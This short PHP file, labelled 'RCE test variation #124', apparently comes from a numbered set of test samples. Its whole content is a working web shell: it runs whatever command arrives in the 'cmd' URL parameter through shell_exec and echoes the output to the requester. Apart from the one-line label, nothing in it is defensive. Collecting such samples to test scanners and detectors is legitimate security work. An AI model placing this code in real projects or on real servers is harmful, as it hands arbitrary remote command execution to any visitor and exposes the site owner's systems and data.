<?php
// RCE test variation #124
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>